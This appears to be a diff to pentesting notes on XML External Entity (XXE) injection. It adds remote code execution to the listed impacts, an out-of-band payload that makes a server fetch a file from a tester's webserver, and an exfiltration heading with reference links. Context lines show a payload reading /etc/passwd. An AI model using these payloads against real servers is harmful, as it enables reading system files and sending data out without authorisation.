@@ -5,6 +5,7 @@ With this attack you can do:
 * Read local files
 * Denial-of-service
 * Perform port-scan
+* Remote Code Execution
 
 Where do you find it:
 
@@ -99,11 +100,21 @@ If "testdata" gets reflected then it is vulnerable to XXE. If it gets reflected 
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
 
+Another way to test it is to see if the server tries to download the external script. Firs t you need to set up your own webserver, and then wait for it to connect.
 
+```
+<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://192.168.1.101/fil.txt">]><test>&xxe;</test>
+```
+
+### Exfiltrate data through URL
+
+https://blog.bugcrowd.com/advice-from-a-researcher-xxe/
 
 ### References
 
 [https://securitytraning.com/xml-external-entity-xxe-xml-injection-web-for-pentester/](https://securitytraning.com/xml-external-entity-xxe-xml-injection-web-for-pentester/)
 
-https://blog.bugcrowd.com/advice-from-a-researcher-xxe/
+[https://blog.bugcrowd.com/advice-from-a-researcher-xxe/](https://blog.bugcrowd.com/advice-from-a-researcher-xxe/)
+
+http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html
 
